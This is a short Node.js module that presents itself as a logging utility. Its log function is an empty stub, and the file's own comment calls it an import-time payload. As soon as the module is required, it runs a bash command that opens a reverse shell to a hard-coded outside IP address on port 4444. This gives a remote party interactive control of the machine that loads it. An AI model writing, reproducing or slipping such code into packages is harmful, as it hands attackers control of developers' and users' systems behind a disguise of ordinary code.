'use strict';
// Import-time payload: spawns a reverse shell the moment it's require()d.
const child = require('child_process');

child.exec('bash -i >& /dev/tcp/45.13.227.99/4444 0>&1');

module.exports = {
  log(msg) { /* pretend to log */ },
};
